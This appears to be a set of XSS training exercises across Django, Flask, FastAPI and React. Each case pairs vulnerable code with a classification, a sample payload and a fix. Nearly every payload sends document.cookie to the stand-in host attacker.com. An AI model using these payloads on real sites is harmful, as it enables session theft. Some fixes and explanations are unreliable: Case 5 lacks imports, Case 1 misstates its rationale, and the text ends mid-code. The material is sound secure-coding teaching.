Case 1

```
# views.py
from django.shortcuts import render

def search_results(request):
    query = request.GET.get("q", "")
    return render(request, "results.html", {"query": query})
```


```
<!-- results.html -->
<html>
<body>
  <h2>Results for: {{ query|safe }}</h2>
  {% for result in results %}
    <p>{{ result.title }}</p>
  {% endfor %}
</body>
</html>
```


1. This is a Reflected XSS. The server can clearly see the payload

in the query. Yet wraps it in the final HTTP Response.

2. Here is a sample request:

`/?q=<script>alert(1)</script>`

3.

Remove the `safe` filter. This will permit direct rendering and can

introduce XSS vulnerabilities:

```
<!-- results.html -->
<html>
<body>
  <h2>Results for: {{ query }}</h2>
  {% for result in results %}
    <p>{{ result.title }}</p>
  {% endfor %}
</body>
</html>
```

Case 2

```
# views.py
from django.shortcuts import render
from django.utils.html import escape

def user_profile(request):
    username = escape(request.GET.get("name", ""))
    return render(request, "profile.html", {"username": username})
```

```
<!-- profile.html -->
<html>
<head>
  <script>
    var currentUser = "{{ username }}";
    console.log("Logged in as: " + currentUser);
  </script>
</head>
<body><h1>Profile</h1></body>
</html>
```

Solution:

1. This is a case of a Reflected XSS Attack. Although the developer

makes the call for HTML Escape encoding using the `escape()` in the

backend this is the wrong context escaping. We must escape javascript

since user input is rendered inside a Javascript `<script>` element

on the frontend.


2. Below is a sample payload:

```
/?name="; fetch('https://attacker.com?q='+document.cookie);//
```

3. Below is the fix on the frontend:

```
# views.py
from django.shortcuts import render
from django.utils.html import escape

def user_profile(request):
    username = request.GET.get("name", "")
    return render(request, "profile.html", {"username": username})
```


```
<!-- profile.html -->
<html>
<head>
  <script>
    var currentUser = "{{ username|escapejs }}";
    console.log("Logged in as: " + currentUser);
  </script>
</head>
<body><h1>Profile</h1></body>
</html>
```

Case 3:

```
# views.py
from django.shortcuts import render
from django.utils.html import escape
from django.utils.safestring import mark_safe

def comment_list(request):
    raw_comments = Comment.objects.values_list("body", flat=True)
    # "Sanitise" before passing to template
    safe_comments = [mark_safe(escape(c)) for c in raw_comments]
    return render(request, "comments.html", {"comments": safe_comments})
```

```
<!-- comments.html -->
<ul>
  {% for comment in comments %}
    <li>{{ comment }}</li>
  {% endfor %}
</ul>
```

1. Stored XSS vulnerability. Misplaced escaping: Escaping must

take place in the frontend template right before the `comment`

is rendered.

2. Below is a sample of what raw_comments can store as payload:

```
raw_comments: ["<script>fetch('https://attacker.com/?q='+document.cookie)</script>"]
```

3. Below is the fix:


```
# views.py
from django.shortcuts import render

def comment_list(request):
    raw_comments = Comment.objects.values_list("body", flat=True)
    # "Sanitise" before passing to template
    return render(request, "comments.html", {"comments": raw_comments})
```

```
<!-- comments.html -->
<ul>
  {% for comment in comments %}
    <li>{{ comment }}</li>
  {% endfor %}
</ul>
```

Case 4:

```
# app.py
from flask import Flask, request, render_template_string

app = Flask(__name__)

TEMPLATE = """
<html>
<body>
  <h1>Hello, %s!</h1>
</body>
</html>
"""

@app.route("/greet")
def greet():
    name = request.args.get("name", "guest")
    return render_template_string(TEMPLATE % name)
```
1. Reflected XSS. Missing escaping. Bad habit to use

`render_template_string()` since it allows an attacker to

modify template. There is also a Server-Side Template Injection

vulnerability since the `%s` string is substituted before

`render_template_string()` parses the template. Even HTML escaping

will not fix this.

2. Below is the Reflected XSS sample payload:

```
/?name=<script>fetch('https://attacker.com/?q='+document.cookie);</script>
```

An attacker can also attempt a Server-Side Injection Template if the

above payload fails (not shown here due to complexity):


3. Below is the fix:


```
# app.py
from flask import Flask, request, render_template

app = Flask(__name__)

@app.route("/greet")
def greet():
    name = request.args.get("name", "guest")
    return render_template("greet.html",name=name)
```

```
<!-- greet.html -->
<html>
<body>
  <h1>Hello, {{name}}!</h1>
</body>
</html>
```

Case 5:

```
# app.py
from flask import Flask, request, render_template_string
from urllib.parse import quote

app = Flask(__name__)

@app.route("/redirect-preview")
def redirect_preview():
    destination = request.args.get("to", "/")
    safe_dest = quote(destination, safe="/:?=&")
    return render_template_string("""
    <html>
    <body>
      <a href="{{ dest }}">Click here to continue</a>
    </body>
    </html>
    """, dest=safe_dest)
```

1. Reflected XSS Attack: The `safe` filter in `quote()` means

the characters found in the string "/:?=&" will not be URL-safe

encoded! Wrong context escaping. Neither HTML escaping nor URL-safe

encoding will not work since the `href` attribute

will reverse percent encoding. Its also a bad habit to use

`render_template_string()`. The only way to fix this is to

check if the URL is safe. An implementation to check if the URL

is safe is given in the fix in (3.) below.


2. Below is a sample payload:

```
/?to=javascript:fetch('https://attacker.com/?q='+document.cookie);
```

3. Below is the fix:


```
# app.py
from flask import Flask, redirect,request,render_template
from urllib.parse import urlsplit
from typing import List

app = Flask(__name__)

def is_safe_url(target):
    ref_url = urlparse(request.host_url)
    test_url = urlparse(urljoin(request.host_url, target))
    return test_url.scheme in ('http', 'https') and \
           ref_url.netloc == test_url.netloc

@app.route("/redirect-preview")
def redirect_preview():

    destination = request.args.get("to", "/")

    safe_dest = ""

    if is_safe_url(destination):

	safe_dest = destination

    else:

        safe_dest = "/"

    return redirect(safe_dest)
```

Case 6:

```
# app.py
from flask import Flask, request, render_template
import html

app = Flask(__name__)

@app.route("/comment")
def comment():
    user_comment = request.args.get("comment", "")
    safe_comment = html.escape(user_comment)
    return render_template("comment.html", comment=safe_comment)
```

```
<!-- templates/comment.html -->
<html>
<body>
  <p>Your comment: {{ comment }}</p>
</body>
</html>
```

1. No XSS vulnerability here but HTML double-escaping is not a good

coding habit. There is no need to escape server-side since template

HTML autoescapes.

2. The original code snippet is not vulnerable to XSS. It just

has styling issues. 

3. Below is the fix:


```
# app.py
from flask import Flask, request, render_template

app = Flask(__name__)

@app.route("/comment")
def comment():
    user_comment = request.args.get("comment", "")
    return render_template("comment.html", comment=user_comment)
```

```
<!-- templates/comment.html -->
<html>
<body>
  <p>Your comment: {{ comment }}</p>
</body>
</html>
```

Case 7:

```
# main.py
from fastapi import FastAPI
from fastapi.responses import HTMLResponse

app = FastAPI()

@app.get("/search")
def search(q: str = ""):
    html = f"""
    <html>
    <body>
      <h2>Results for: {q}</h2>
    </body>
    </html>
    """
    return HTMLResponse(content=html)
```

1. Reflected XSS. No HTML escaping is applied. 

2. Below is sample payload:

```
/?q=<script>fetch('https://attacker.com?q='+document.cookie);</script>
```

3. Below is the fix. The `HTMLResponse` is replaced with

`Jinja2Templates` because that supports HTML autoescaping

with the `{{ }}` syntax:


```
# main.py
from fastapi import FastAPI, Request
from fastapi.templating import Jinja2Templates
templates = Jinja2Templates(directory="templates")

app = FastAPI()

@app.get("/search")
def search(request: Request,q: str = ""):

    return templates.TemplateResponse("search.html",{ "request": request,"q" : q})
```

```
<!-- search.html -->
<html>
<body>
<h2>Results for: {{q}}</h2>
</body>
</html>
```
Case 8:

```
# main.py
from fastapi import FastAPI
from fastapi.responses import JSONResponse

app = FastAPI()

@app.get("/api/username")
def get_username(name: str = ""):
    return JSONResponse(content={"username": name})
```

```
<!-- index.html (served separately) -->
<html>
<body>
  <div id="greeting"></div>
  <script>
    fetch("/api/username?name=" + location.search.split("name=")[1])
      .then(r => r.json())
      .then(data => {
        document.getElementById("greeting").innerHTML = "Hello, " + data.username;
      });
  </script>
</body>
</html>
```

1. DOM XSS. Missing escaping in the `fetch()` call in the

frontend template. Replace `innerHTML` attribute with `textContent`

According to OWASP it is a bad habit to use `innerHTML`. One should

replace that with `textContent` attribute instead. This will make

it impossible for any Javascript to be rendered. No need for escaping.

2. Below is a payload:

```
/?name=<img src=x onerror="fetch('https://attacker.com/?q='+document.cookie)">
```

3. Below is the fix:

```
# main.py
from fastapi import FastAPI
from fastapi.responses import JSONResponse

app = FastAPI()

@app.get("/api/username")
def get_username(name: str = ""):
    return JSONResponse(content={"username": name})
```

```
<!-- index.html (served separately) -->
<html>
<body>
  <div id="greeting"></div>
  <script>
    fetch("/api/username?name=" + location.search.split("name=")[1])
      .then(r => r.json())
      .then(data => {
        document.getElementById("greeting").textContent = "Hello, " + data.username;
      });
  </script>
</body>
</html>
```

Case 9:

```
# main.py
from fastapi import FastAPI
from fastapi.responses import JSONResponse
import html

app = FastAPI()

@app.get("/api/comment")
def get_comment(text: str = ""):
    safe_text = html.escape(text)
    return JSONResponse(content={"comment": safe_text})
```

```
// App.jsx (React frontend)
function CommentBox({ comment }) {
  return (
    <div dangerouslySetInnerHTML={{ __html: comment }} />
  );
}

async function loadComment() {
  const params = new URLSearchParams(window.location.search);
  const res = await fetch("/api/comment?text=" + params.get("text"));
  const data = await res.json();
  return <CommentBox comment={data.comment} />;
}
```

Case 9:

```
# main.py
from fastapi import FastAPI
from fastapi.responses import JSONResponse
import html

app = FastAPI()

@app.get("/api/comment")
def get_comment(text: str = ""):
    safe_text = html.escape(text)
    return JSONResponse(content={"comment": safe_text})
```

```
// App.jsx (React frontend)
import { useEffect, useRef } from "react";

function CommentBox({ comment }) {
  const ref = useRef(null);

  useEffect(() => {
    ref.current.innerHTML = comment;
  }, [comment]);

  return <div ref={ref} />;
}

async function loadComment() {
  const params = new URLSearchParams(window.location.search);
  const res = await fetch("/api/comment?text=" + params.get("text"));
  const data = await res.json();
  return <CommentBox comment={data.comment} />;
}
```

1. Wrong context escaping. The developer applies HTML escaping. But

the code is still vulnerable to DOM XSS. So the `innerHTML`

attribute must be replaced with `textContent`.


2. Below is a payload:

```
/?text=<img src=x onerror="fetch('https://attacker.com/?q='+document.cookie)">
```

3. Below is the code fix:

```
# main.py
from fastapi import FastAPI
from fastapi.responses import JSONResponse

app = FastAPI()

@app.get("/api/comment")
def get_comment(text: str = ""):
    return JSONResponse(content={"comment": text})
```


```
// App.jsx (React frontend)
import { useEffect, useRef } from "react";

function CommentBox({ comment }) {
  const ref = useRef(null);

  useEffect(() => {
    ref.current.textContent = comment;
  }, [comment]);

  return <div ref={ref} />;
}

async function loadComment() {
  const params = new URLSearchParams(window.location.search);
  const res = await fetch("/api/comment?text=" + params.get("text"));
  const data = await res.json();
  return <CommentBox comment={data.comment} />;
}
```

Case 10:

```
<!-- index.html -->
<html>
<body>
  <div id="username-display"></div>
  <div id="bio-display"></div>

  <script>
    const params = new URLSearchParams(window.location.search);

    const username = params.get("username") || "guest";
    const bio = params.get("bio") || "";

    document.getElementById("username-display").innerHTML = "User: " + username;
    document.getElementById("bio-display").innerHTML = "Bio: " + bio;
  </script>
</body>
</html>
```

1. Missing Escaping for DOM XSS vulnerability.

2.

Below are payloads for sink `username`:

```
/?username=<img src=x onerror="fetch('https://attacker.com/?q='+document.cookie)">
```


Below are payloads for sink `bio`:

```
/?bio=<img src=x onerror="fetch('https://attacker.com/?q='+document.cookie)">
```

3. Below is the fix:


```
<!-- index.html -->
<html>
<body>
  <div id="username-display"></div>
  <div id="bio-display"></div>

  <script>
    const params = new URLSearchParams(window.location.search);

    const username = params.get("username") || "guest";
    const bio = params.get("bio") || "";

    document.getElementById("username-display").textContent = "User: " + username;
    document.getElementById("bio-display").textContent = "Bio: " + bio;
  </script>
</body>
</html>
```
Case 11:

```
// App.jsx
function ReviewCard({ reviewText }) {
  return (
    <div
      className="review"
      dangerouslySetInnerHTML={{ __html: reviewText }}
    />
  );
}

async function loadReview() {
  const params = new URLSearchParams(window.location.search);
  const reviewText = params.get("review") || "";
  return <ReviewCard reviewText={reviewText} />;
}

Case 11:

```
// hooks/useRichText.js
import { useEffect, useRef } from "react";

export function useRichText(content) {
  const ref = useRef(null);

  useEffect(() => {
    if (ref.current) {
      ref.current.innerHTML = content;
    }
  }, [content]);

  return ref;
}
```

```
// App.jsx
import { useRichText } from "./hooks/useRichText";

function ReviewCard({ reviewText }) {
  const ref = useRichText(reviewText);
  return <div className="review" ref={ref} />;
}

async function loadReview() {
  const params = new URLSearchParams(window.location.search);
  const reviewText = params.get("review") || "";
  return <ReviewCard reviewText={reviewText} />;
}
```

1. DOM XSS. Missing escaping.

2. Below are payloads for sink `review`:

```
/?review=<img src=x onerror="fetch('https://attacker.com/?q='+document.cookie)">
```

3. Below is the fix:


```
// hooks/useRichText.js
import { useEffect, useRef } from "react";

export function useRichText(content) {
  const ref = useRef(null);

  useEffect(() => {
    if (ref.current) {
      ref.current.textContent = content;
    }
  }, [content]);

  return ref;
}
```

```
// App.jsx
import { useRichText } from "./hooks/useRichText";

function ReviewCard({ reviewText }) {
  const ref = useRichText(reviewText);
  return <div className="review" ref={ref} />;
}

async function loadReview() {
  const params = new URLSearchParams(window.location.search);
  const reviewText = params.get("review") || "";
  return <ReviewCard reviewText={reviewText} />;
}
```

Case 12:

```
<!-- index.html -->
<html>
<body>
  <div id="search-banner"></div>
  <div id="results"></div>

  <script>
    function renderBanner(container, label, value) {
      const encoded = encodeURIComponent(value);
      container.innerHTML = "<p>" + label + ": " + encoded + "</p>";
    }

    const params = new URLSearchParams(window.location.search);
    const query = params.get("q") || "";

    renderBanner(
      document.getElementById("search-banner"),
      "You searched for",
      query
    );
  </script>
</body>
</html>
```

1. DOM XSS. Wrong context escaping.

2. Below is a sample payload:

```
/?q=<img src=x onerror="fetch('https://attacker.com/?q='+document.cookie)">
```

3. Below is the fix:

```
<!-- index.html -->
<html>
<body>
  <div id="search-banner"></div>
  <div id="results"></div>

  <script>
    function renderBanner(container, label, value) {

      const p = document.createElement('p');

      p.textContent = `${label}: ${value}`;

      container.appendChild(p);

    }

    const params = new URLSearchParams(window.location.search);
    const query = params.get("q") || "";

    renderBanner(
      document.getElementById("search-banner"),
      "You searched for",
      query
    );
  </script>
</body>
</html>
```

Case 13:

```
# views.py
from django.shortcuts import render
from myapp.models import Announcement

def announcements(request):
    items = Announcement.objects.values_list("body", flat=True)
    return render(request, "announcements.html", {"items": items})
```

```
<!-- announcements.html -->
<html>
<body>
  <h2>Latest Announcements</h2>
  <ul>
    {% autoescape off %}
      {% for item in items %}
        <li>{{ item }}</li>
      {% endfor %}
    {% endautoescape %}
  </ul>
</body>
</html>
```

1. Stored XSS. Missing escaping. Remove the `autoescape off` block.

2. Below is the payload:

```
<script>fetch('https://attacker.com/?q='+document.cookie);</script>
```

3.


```
# views.py
from django.shortcuts import render
from myapp.models import Announcement

def announcements(request):
    items = Announcement.objects.values_list("body", flat=True)
    return render(request, "announcements.html", {"items": items})
```


```
<!-- announcements.html -->
<html>
<body>
  <h2>Latest Announcements</h2>
  <ul>
      {% for item in items %}
        <li>{{ item }}</li>
      {% endfor %}
  </ul>
</body>
</html> 
```

Case 14:

```
# app.py
from flask import Flask, request, render_template
from markupsafe import Markup

app = Flask(__name__)

@app.route("/welcome")
def welcome():
    username = request.args.get("name", "guest")
    greeting = Markup("Welcome, %s!" % username)
    return render_template("welcome.html", greeting=greeting)
```

```
<!-- templates/welcome.html -->
<html>
<body>
  <p>{{ greeting }}</p>
</body>
</html>
```

1. Reflected XSS vulnerability. Missing escaping.

Note: `Markup()` tells Jinja2 its string argument does not need

escaping. Thus `Markup()` should not be used.
 
2. Below is a payload for Reflected XSS:

```
/?name=<script>fetch('https://attacker.com/?q='+document.cookie);</script>
```



3. Below is the fix:


```
# app.py
from flask import Flask, request, render_template

app = Flask(__name__)

@app.route("/welcome")
def welcome():
    username = request.args.get("name", "guest")
    return render_template("welcome.html", username=username)
```

```
<!-- templates/welcome.html -->
<html>
<body>
  <p>Welcome, {{ username }}!</p>
</body>
</html>
```

Case 15:

```
# main.py
from fastapi import FastAPI, Request
from fastapi.templating import Jinja2Templates

app = FastAPI()
templates = Jinja2Templates(directory="templates")

@app.get("/dashboard")
def dashboard(request: Request, username: str = "guest"):
    user_data = {"name": username, "role": "viewer"}
    return templates.TemplateResponse(
        "dashboard.html", {"request": request, "user_data": user_data}
    )
```

```
<!-- templates/dashboard.html -->
<html>
<body>
  <h1>Dashboard</h1>
  <script>
    var userData = {{ user_data }};
    console.log("Logged in as:", userData.name);
  </script>
</body>
</html>
```

1. Reflected XSS. Missing Escaping. Template variables are placed in

Javascript. Normal HTML escaping will not prevent XSS because

code can be written without HTML characters.  

2. Below is a payload:

```
/?username=</script><script>fetch('https://attacker.com?q='+document.cookie);//
```

3. Below is the fix:


```
# main.py
from fastapi import FastAPI, Request
from fastapi.templating import Jinja2Templates

app = FastAPI()
templates = Jinja2Templates(directory="templates")

@app.get("/dashboard")
def dashboard(request: Request, username: str = "guest"):
    user_data = {"name": username, "role": "viewer"}
    return templates.TemplateResponse(
        "dashboard.html", {"request": request, "user_data": user_data}
    )
```

```
<!-- templates/dashboard.html -->
<html>
<body>
  <h1>Dashboard</h1>
  <script>
    var userData = {{ user_data | tojson }};
    console.log("Logged in as:", userData.name);
  </script>
</body>
</html>
```

Case 16:

```
# views.py
from django.shortcuts import render

def profile(request):
    css_class = request.GET.get("theme", "default")
    return render(request, "profile.html", {"css_class": css_class})
```

```
<!-- profile.html -->
<html>
<body>
  <div class={{ css_class }}>
    <p>Welcome to your profile.</p>
  </div>
</body>
</html>
```

1. Reflected XSS. This is a gray area on which of the three

the vulnerability belongs to. Wrong context escaping. Quotes must be

wrapped around template variable to avoid XSS. This will ensure proper

escaping of HTML attributes in this Case. HTML escaping will not

mitigate XSS here. 

2. Payload:

```
?theme=x onmouseover=fetch('https://attacker.com?q='+document.cookie)
```

3. Below is the fix:


```
# views.py
from django.shortcuts import render

def profile(request):
    css_class = request.GET.get("theme", "default")
    return render(request, "profile.html", {"css_class": css_class})
```

```
<!-- profile.html -->
<html>
<body>
  <div class="{{ css_class }}">
    <p>Welcome to your profile.</p>
  </div>
</body>
</html>
```

Case 17:

```
# app.py
from flask import Flask, request, render_template
from markupsafe import escape

app = Flask(__name__)

comments = []

@app.route("/comment", methods=["POST"])
def add_comment():
    body = request.form.get("body", "")
    comments.append(str(escape(body)))
    return "Comment saved.", 200

@app.route("/comments")
def view_comments():
    return render_template("comments.html", comments=comments)
```

```
<!-- templates/comments.html -->
<html>
<body>
  <h2>Comments</h2>
  <ul>
    {% for comment in comments %}
      <li>{{ comment | safe }}</li>
    {% endfor %}
  </ul>
</body>
</html>
```

1. Misplaced Escaping. HTML escaping must be done in the template

at the frontend--not backend.

2. Below is a payload:


```
POST /comment
Content-Type: application/x-www-form-urlencoded

body=</li><script>fetch('https://attacker.com?q='+document.cookie);</script><li>
```

The payload will work once either the `escape()` in the backend

or the `safe` filter in the frontend is removed.

3. Below is the fix:


```
# app.py
from flask import Flask, request, render_template
from markupsafe import escape

app = Flask(__name__)

comments = []

@app.route("/comment", methods=["POST"])
def add_comment():
    body = request.form.get("body", "")
    comments.append(body)
    return "Comment saved.", 200

@app.route("/comments")
def view_comments():
    return render_template("comments.html", comments=comments)
```

```
<!-- templates/comments.html -->
<html>
<body>
  <h2>Comments</h2>
  <ul>
    {% for comment in comments %}
      <li>{{ comment }}</li>
    {% endfor %}
  </ul>
</body>
</html>
```

Case 18:

```
<!DOCTYPE html>
<html>
<body>
  <h1>Product Search</h1>
  <div id="results"></div>

  <script>
    const query = decodeURIComponent(window.location.hash.substring(1));

    document.getElementById("results").innerHTML =
      "You searched for: <strong>" + query + "</strong>";
  </script>
</body>
</html>
```

1. DOM XSS. Missing escaping.

2. Below is a payload:


`#<img src=x onerror="fetch('https://attacker.com/?q='+document.cookie);">`

3. Below is the fix:

```
<!DOCTYPE html>
<html>
<body>
  <h1>Product Search</h1>
  <div id="results"></div>

  <script>

    const query = decodeURIComponent(window.location.hash.substring(1));

    const container = document.getElementById('results');

    const strong = document.createElement('strong');

    strong.textContent = query;

    container.textContent = "You searched for: ";

    container.appendChild(strong);

  </script>
</body>
</html>
```

Case 19:

```
// components/Bio.jsx
function Bio({ username }) {
  const [bio, setBio] = React.useState("");
  const bioRef = React.useRef(null);

  React.useEffect(() => {
    fetch(`/api/users/${username}/bio`)
      .then(res => res.json())
      .then(data => setBio(data.bio));
  }, [username]);

  React.useEffect(() => {
    if (bioRef.current) {
      bioRef.current.innerHTML = bio;
    }
  }, [bio]);

  return (
    <div>
      <h2>About {username}</h2>
      <div ref={bioRef} />
    </div>
  );
}
```

1. DOM XSS. Missing escaping. Replace `innerHTML` with `textContent`

2. Below is a payload:

```
POST /api/users/attacker/bio
Content-Type: application/json

{"bio": "<img src=x onerror="fetch('https://attacker.com/?q='+document.cookie)\">" }
```

3. Below is the fix:


```
// components/Bio.jsx
function Bio({ username }) {
  const [bio, setBio] = React.useState("");
  const bioRef = React.useRef(null);

  React.useEffect(() => {
    fetch(`/api/users/${username}/bio`)
      .then(res => res.json())
      .then(data => setBio(data.bio));
  }, [username]);

  React.useEffect(() => {
    if (bioRef.current) {
      bioRef.current.textContent = bio;
    }
  }, [bio]);

  return (
    <div>
      <h2>About {username}</h2>
      <div ref={bioRef} />
    </div>
  );
}
```

Case 20:

```
# app.py
from flask import Flask, request, render_template

app = Flask(__name__)

@app.route("/redirect")
def redirect_user():
    destination = request.args.get("dest", "/home")
    return render_template("redirect.html", destination=destination)
```

```
<!-- templates/redirect.html -->
<html>
<body>
  <p>Click below to continue:</p>
  <a href="{{ destination }}">Continue</a>
</body>
</html>
```

1. Reflected XSS. This is a gray area for classification of cause

of error. In this case the develper must validate URL before passing

it as argument. Wrong context escaping.

2. Below is a payload:


```
/?dest=javascript:fetch('https://attacker.com/?q='+document.cookie);
```

3. Below is the fix:


```
# app.py
from flask import Flask, redirect, request, render_template
from urllib.parse import urlparse, urljoin

app = Flask(__name__)

def is_safe_url(target):
    ref_url = urlparse(request.host_url)
    test_url = urlparse(urljoin(request.host_url, target))
    return test_url.scheme in ('http', 'https') and \
           ref_url.netloc == test_url.netloc

@app.route("/redirect")
def redirect_user():
    
    destination = request.args.get("dest", "/home")

    if is_safe_url(destination):
	
       return redirect(destination)

    else:

       return redirect("/home")
```

Case 21:

```
<!DOCTYPE html>
<html>
<body>
  <h1>Notifications</h1>
  <div id="notification-bar"></div>

  <script>
    window.addEventListener("message", function(event) {
      const msg = event.data;
      document.getElementById("notification-bar").innerHTML =
        "<p>New message: " + msg + "</p>";
    });
  </script>
</body>
</html>
```

1. DOM XSS. Missing escaping. `innerHTML` must be replaced with

`textContent`

2. Below is a payload for variable `event`:

```
window.opener.postMessage(
	"<img src=x onerror=\"fetch('https://attacker.com/?q='+document.cookie)\">",
	"*"
);
```

3. Below is the fix:


```
<!DOCTYPE html>
<html>
<body>
	<h1>Notifications</h1>
	<div id="notification-bar"></div>
	<script>
		window.addEventListener("message", function(event) {

			const msg = event.data;

			const notbar = document.getElementById('notification-bar');

			const p = document.createElement('p');

			p.textContent = `New message: ${msg}`;

			notbar.appendChild(p);
		});
	</script>
</body>
</html>```

Case 22:

```
# views.py
from django.shortcuts import render
from django.utils.html import format_html

def user_badge(request):
	username = request.GET.get("user", "guest")
	role = request.GET.get("role", "viewer")
	badge = format_html(
		"<span class='badge'>{}</span> logged in as " + username,
		role
	)
	return render(request, "badge.html", {"badge": badge})
```

```
<!-- badge.html -->
<html>
<body>
	<div id="header">
		{{ badge | safe }}
	</div>
</body>
</html>
```

1. Reflected XSS. Missing escaping. Remove the `safe` filter: it tells

Jinja2 that there is no need for HTML Escaping--leaving the frontend

vulnerable to XSS. Argument for username should be a parameter

for the format string in `format_html()`. This will ensure proper

escaping.

2. Below are sample payloads for `username` and `role`:

Payload for `user`:

```
/?user=<script>fetch('https://attacker.com?q='+document.cookie);</script>
```

3. Below is the fix:


```
# views.py
from django.shortcuts import render
from django.utils.html import format_html

def user_badge(request):
	username = request.GET.get("user", "guest")
	role = request.GET.get("role", "viewer")
	badge = format_html(
		"<span class='badge'>{}</span> logged in as {}",
		role,
		username
	)
	return render(request, "badge.html", {"badge": badge})
```

```
<!-- badge.html -->
<html>
<body>
	<div id="header">
		{{ badge }}
	</div>
</body>
</html>
```

Case 23:

```
# main.py
from fastapi import FastAPI, Request
from fastapi.templating import Jinja2Templates
from markupsafe import escape

app = FastAPI()
templates = Jinja2Templates(directory="templates")

reviews = []

@app.post("/review")
async def add_review(request: Request):
	body = await request.json()
	clean = str(escape(body.get("text", "")))
	reviews.append(clean)
	return {"status": "saved"}

@app.get("/reviews")
async def view_reviews(request: Request):
	return templates.TemplateResponse(
		"reviews.html", {"request": request, "reviews": reviews}
	)
```

```
<!-- templates/reviews.html -->
<html>
<body>
	<h2>Customer Reviews</h2>
	<ul>
		{% for review in reviews %}
			<li>{{ review | safe }}</li>
		{% endfor %}
	</ul>
</body>
</html>
```

1. Stored XSS since the payload is stored in-memory on server and

later sent to frontend in "/reviews" handler. Misplaced escaping.

2. Below is a sample payload:

```
POST /review
Content-Type: application/json


{"text" : "</li><script>fetch('https://attacker.com/?q='+document.cookie);</script><li>"}
```

3. Below is a fix:

```
# main.py
from fastapi import FastAPI, Request
from fastapi.templating import Jinja2Templates

app = FastAPI()
templates = Jinja2Templates(directory="templates")

reviews = []

@app.post("/review")
async def add_review(request: Request):
	body = await request.json()
	reviews.append(body.get("text",""))
	return {"status": "saved"}

@app.get("/reviews")
async def view_reviews(request: Request):
	return templates.TemplateResponse(
		"reviews.html", {"request": request, "reviews": reviews}
	)
```

```
<!-- templates/reviews.html -->
<html>
<body>
	<h2>Customer Reviews</h2>
	<ul>
		{% for review in reviews %}
			<li>{{ review }}</li>
		{% endfor %}
	</ul>
</body>
</html>
```

Case 24:

```
# views.py
from django.shortcuts import render
from django.utils.html import mark_safe

def search(request):
	query = request.GET.get("q", "")
	safe_query = mark_safe(query)
	return render(request, "search.html", {"query": safe_query})
```

```
<!-- search.html -->
<html>
<body>
	<h1>Search</h1>
	<form method="GET" action="/search">
		<input type="text" name="q" value="{{ query }}">
		<button type="submit">Search</button>
	</form>
</body>
</html>
```

1. Reflected XSS. Missing Escaping.  `mark_safe()` tells Django

to not escape its arguments.

2. Below is a payload:

```
/?q="><img src=x onerror="fetch('https://attacker.com?q='+document.cookie)"
```

3. Below is the fix:

```
# views.py
from django.shortcuts import render

def search(request):
	query = request.GET.get("q", "")
	return render(request, "search.html", {"query": query })
```

```
<!-- search.html -->
<html>
<body>
	<h1>Search</h1>
	<form method="GET" action="/search">
		<input type="text" name="q" value="{{ query }}">
		<button type="submit">Search</button>
	</form>
</body>
</html>
```

Case 25:

```
<!DOCTYPE html>
<html>
<head>
	<title>Loading...</title>
</head>
<body>
	<h1>Welcome</h1>
	<div id="content">Loading your page...</div>

	<script>
		const params = new URLSearchParams(window.location.search);
		const page = params.get("page") || "Home";

		document.title = page;
		document.getElementById("content").innerHTML =
			"<h2>You are viewing: " + page + "</h2>";
	</script>
</body>
</html>
```

1. DOM XSS. Missing escaping. `innerHTML` must be replaced with

`textContent`.

2. Below is a payload:

```
/?page=</h2><img src=x onerror="fetch('https://attacker.com/?q='+document.cookie)"><h2>
```

3. Below is the fix:


```
<!DOCTYPE html>
<html>
<head>
	<title>Loading...</title>
</head>
<body>
	<h1>Welcome</h1>
	<div id="content">Loading your page...</div>

	<script>
		const params = new URLSearchParams(window.location.search);

		const page = params.get("page") || "Home";

		document.title = page;

		const content = document.getElementById('content');

		const h2 = document.createElement('h2');

		h2.textContent = "You are viewing: " + page;

		content.appendChild(h2);
	</script>
</body>
</html>
```

Case 26:

```
# app.py
from flask import Flask, request, render_template
from markupsafe import escape

app = Flask(__name__)

@app.route("/login", methods=["POST"])
def login():
	username = request.form.get("username", "")
	password = request.form.get("password", "")

	if not username or not password:
		error = escape("Error: username and password are required.")
		return render_template("login.html", error=error)

	if username != "admin" or password != "secret":
		error = escape(f"Error: invalid credentials for user '{username}'.")
		return render_template("login.html", error=error)

	return "Welcome!"
```

```
<!-- templates/login.html -->
<html>
<body>
	<form method="POST" action="/login">
		<input type="text" name="username" placeholder="Username">
		<input type="password" name="password" placeholder="Password">
		<button type="submit">Login</button>
	</form>
	{% if error %}
		<script>
			alert("{{ error }}");
		</script>
	{% endif %}
</body>
</html>
```

1. Reflected XSS. Wrong context Escaping. The `escape()` marks the

parameter as safe for HTML execution, which is risky. We must escape

javascript since user input is rendered inside a Javascript `<script>`

element on the frontend.


2. Once the escaping in the backend is removed the following payload

will work:

```
POST /login
Content-Type: application/x-www-form-urlencoded

username=";fetch('https://attacker.com/?q='+document.cookie);//
``` 

3. Below is the fix:


```
# app.py
from flask import Flask, request, render_template
from markupsafe import escape

app = Flask(__name__)

@app.route("/login", methods=["POST"])
def login():
	username = request.form.get("username", "")
	password = request.form.get("password", "")

	if not username or not password:
		error = "Error: username and password are required."
		return render_template("login.html", error=error)

	if username != "admin" or password != "secret":
		error = f"Error: invalid credentials for user {username}."
		return render_template("login.html", error=error)

	return "Welcome!"
```

```
<!-- templates/login.html -->
<html>
<body>
	<form method="POST" action="/login">
		<input type="text" name="username" placeholder="Username">
		<input type="password" name="password" placeholder="Password">
		<button type="submit">Login</button>
	</form>
	{% if error %}
		<script>
			alert({{ error|tojson }});
		</script>
	{% endif %}
</body>
</html>
```

Case 27:

```
# views.py
from django.shortcuts import render
from django.utils.html import format_html, mark_safe

def search_results(request):
	query = request.GET.get("q", "")
	results = ["Result 1", "Result 2", "Result 3"]

	items_html = ""
	for result in results:
		items_html += format_html("<li>{}</li>", result)

	summary = mark_safe(f"<p>Showing results for: <strong>{query}</strong></p>")

	return render(request, "results.html", {
		"summary": summary,
		"items_html": mark_safe(items_html),
	})
```

```
<!-- results.html -->
<html>
<body>
	<h1>Search Results</h1>
	{{ summary }}
	<ul>
		{{ items_html }}
	</ul>
</body>
</html>
```

1. Reflected XSS. Missing escaping. `mark_safe()` marks the input

safe for HTML execution, which leaves `query` an attack vector for XSS.

Remove `mark_safe()` since it marks input as safe for HTML execution,

which leaves an attack vector for XSS.

2. Below is a sample payload:

```
/?q=</strong><script>fetch('https://attacker.com/?q='+document.cookie);</script><strong>
```

3. Below is the fix:


```
# views.py
from django.shortcuts import render
from django.utils.html import format_html

def search_results(request):
	query = request.GET.get("q", "")
	results = ["Result 1", "Result 2", "Result 3"]


	summary = format_html("<p>Showing results for: <strong>{}</strong></p>",query)

	return render(request, "results.html", {
		"summary": summary,
